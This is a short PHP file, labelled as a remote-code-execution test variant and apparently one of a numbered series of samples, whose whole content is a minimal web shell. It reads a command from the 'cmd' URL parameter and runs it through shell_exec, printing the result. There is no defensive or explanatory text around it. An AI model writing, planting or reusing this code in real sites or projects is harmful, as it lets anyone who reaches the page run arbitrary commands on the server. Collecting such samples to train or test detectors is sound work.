<?php
// RCE test variation #406
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>